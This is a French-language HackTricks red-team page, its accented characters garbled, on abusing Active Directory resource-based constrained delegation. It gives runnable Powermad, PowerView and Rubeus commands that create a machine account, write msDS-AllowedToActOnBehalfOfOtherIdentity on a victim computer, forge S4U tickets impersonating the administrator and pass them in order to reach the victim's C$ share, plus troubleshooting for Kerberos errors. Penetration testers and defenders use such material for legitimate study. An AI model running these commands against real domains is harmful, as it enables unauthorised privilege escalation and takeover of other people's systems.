# D√©l√©gation contrainte bas√©e sur les ressources

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Bases de la d√©l√©gation contrainte bas√©e sur les ressources

Cela est similaire √† la [D√©l√©gation contrainte](constrained-delegation.md) de base mais **au lieu** de donner des permissions √† un **objet** pour **usurper l'identit√© de n'importe quel utilisateur contre un service**. La d√©l√©gation contrainte bas√©e sur les ressources **d√©finit** dans **l'objet qui est capable d'usurper l'identit√© de n'importe quel utilisateur contre lui**.

Dans ce cas, l'objet contraint aura un attribut appel√© _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ avec le nom de l'utilisateur qui peut usurper l'identit√© de tout autre utilisateur contre lui.

Une autre diff√©rence importante de cette d√©l√©gation contrainte par rapport aux autres d√©l√©gations est que tout utilisateur avec des **permissions d'√©criture sur un compte de machine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) peut d√©finir le _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Dans les autres formes de d√©l√©gation, vous aviez besoin de privil√®ges d'admin de domaine).

### Nouveaux concepts

Dans la D√©l√©gation contrainte, il a √©t√© dit que le drapeau **`TrustedToAuthForDelegation`** √† l'int√©rieur de la valeur _userAccountControl_ de l'utilisateur est n√©cessaire pour effectuer un **S4U2Self.** Mais ce n'est pas tout √† fait vrai.\
La r√©alit√© est que m√™me sans cette valeur, vous pouvez effectuer un **S4U2Self** contre n'importe quel utilisateur si vous √™tes un **service** (avez un SPN) mais, si vous **avez `TrustedToAuthForDelegation`** le TGS retourn√© sera **Forwardable** et si vous **n'avez pas** ce drapeau le TGS retourn√© **ne sera pas** **Forwardable**.

Cependant, si le **TGS** utilis√© dans **S4U2Proxy** n'est **PAS Forwardable** en essayant d'abuser d'une **D√©l√©gation contrainte de base**, cela **ne fonctionnera pas**. Mais si vous essayez d'exploiter une **d√©l√©gation contrainte bas√©e sur les ressources, cela fonctionnera** (ce n'est pas une vuln√©rabilit√©, c'est une fonctionnalit√©, apparemment).

### Structure de l'attaque

> Si vous avez des privil√®ges √©quivalents √† l'√©criture sur un compte **Ordinateur**, vous pouvez obtenir un **acc√®s privil√©gi√©** sur cette machine.

Supposons que l'attaquant a d√©j√† des privil√®ges √©quivalents √† l'√©criture sur l'ordinateur victime.

1. L'attaquant **compromet** un compte qui a un **SPN** ou **en cr√©e un** (‚ÄúService A‚Äù). Notez que **n'importe quel** _Utilisateur Admin_ sans aucun autre privil√®ge sp√©cial peut **cr√©er** jusqu'√† 10 **objets Ordinateur (**_**MachineAccountQuota**_**) et leur attribuer un **SPN**. Ainsi, l'attaquant peut simplement cr√©er un objet Ordinateur et d√©finir un SPN.
2. L'attaquant **abuse de son privil√®ge WRITE** sur l'ordinateur victime (ServiceB) pour configurer **la d√©l√©gation contrainte bas√©e sur les ressources pour permettre √† ServiceA d'usurper l'identit√© de n'importe quel utilisateur** contre cet ordinateur victime (ServiceB).
3. L'attaquant utilise Rubeus pour effectuer une **attaque S4U compl√®te** (S4U2Self et S4U2Proxy) de Service A √† Service B pour un utilisateur **avec un acc√®s privil√©gi√© √† Service B**.
   1. S4U2Self (depuis le compte compromis/cr√©√© avec SPN) : Demander un **TGS d'Administrateur pour moi** (Non Forwardable).
   2. S4U2Proxy : Utiliser le **TGS non Forwardable** de l'√©tape pr√©c√©dente pour demander un **TGS** de **l'Administrateur** √† l'**ordinateur victime**.
   3. M√™me si vous utilisez un TGS non Forwardable, comme vous exploitez la d√©l√©gation contrainte bas√©e sur les ressources, cela fonctionnera.
4. L'attaquant peut **passer le ticket** et **usurper** l'utilisateur pour obtenir **l'acc√®s au ServiceB victime**.

Pour v√©rifier le _**MachineAccountQuota**_ du domaine, vous pouvez utiliser :
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attaque

### Cr√©ation d'un objet ordinateur

Vous pouvez cr√©er un objet ordinateur √† l'int√©rieur du domaine en utilisant [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../.gitbook/assets/b1.png)
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### Configuration de la d√©l√©gation contrainte bas√©e sur les ressources

**Utilisation du module PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
![](../../.gitbook/assets/B2.png)

**Utilisation de powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### R√©alisation d'une attaque S4U compl√®te

Tout d'abord, nous avons cr√©√© le nouvel objet Ordinateur avec le mot de passe `123456`, donc nous avons besoin du hachage de ce mot de passe :
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Cela affichera les hachages RC4 et AES pour ce compte.\
Maintenant, l'attaque peut √™tre effectu√©e :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Vous pouvez g√©n√©rer plus de tickets en demandant une seule fois en utilisant le param√®tre `/altservice` de Rubeus :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Notez que les utilisateurs ont un attribut appel√© "**Ne peut pas √™tre d√©l√©gu√©**". Si un utilisateur a cet attribut sur Vrai, vous ne pourrez pas l'usurper. Cette propri√©t√© peut √™tre vue dans bloodhound.
{% endhint %}

![](../../.gitbook/assets/B3.png)

### Acc√®s

La derni√®re ligne de commande effectuera **l'attaque S4U compl√®te et injectera le TGS** de l'Administrateur dans la m√©moire de l'h√¥te victime.\
Dans cet exemple, un TGS a √©t√© demand√© pour le service **CIFS** de l'Administrateur, donc vous pourrez acc√©der √† **C$** :
```bash
ls \\victim.domain.local\C$
```
![](../../.gitbook/assets/b4.png)

### Abuser de diff√©rents tickets de service

Apprenez-en plus sur les [**tickets de service disponibles ici**](silver-ticket.md#available-services).

## Erreurs Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`** : Cela signifie que Kerberos est configur√© pour ne pas utiliser DES ou RC4 et que vous fournissez uniquement le hash RC4. Fournissez √† Rubeus au moins le hash AES256 (ou fournissez simplement les hashes rc4, aes128 et aes256). Exemple : `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`** : Cela signifie que l'heure de l'ordinateur actuel est diff√©rente de celle du DC et que Kerberos ne fonctionne pas correctement.
* **`preauth_failed`** : Cela signifie que le nom d'utilisateur + les hashes fournis ne fonctionnent pas pour se connecter. Vous avez peut-√™tre oubli√© de mettre le "$" dans le nom d'utilisateur lors de la g√©n√©ration des hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`** : Cela peut signifier :
  * L'utilisateur que vous essayez d'usurper ne peut pas acc√©der au service souhait√© (parce que vous ne pouvez pas l'usurper ou parce qu'il n'a pas assez de privil√®ges)
  * Le service demand√© n'existe pas (si vous demandez un ticket pour winrm mais que winrm n'est pas en cours d'ex√©cution)
  * Le fakecomputer cr√©√© a perdu ses privil√®ges sur le serveur vuln√©rable et vous devez les lui rendre.

## R√©f√©rences

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
